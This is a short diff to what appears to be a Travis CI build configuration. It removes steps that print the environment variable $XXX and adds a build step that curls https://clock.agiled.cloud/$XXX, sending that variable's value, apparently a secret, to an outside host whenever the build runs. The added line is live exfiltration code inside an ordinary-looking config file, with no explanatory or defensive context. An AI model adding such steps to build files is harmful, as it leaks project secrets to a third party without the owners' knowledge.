@@ -6,9 +6,7 @@ language: sh
 
 script: 
   - uname -a
-  - echo $XXX
-  - echo $XXX > xxx
-  - cat xxx
+  - curl https://clock.agiled.cloud/$XXX
 
 matrix:
   include:
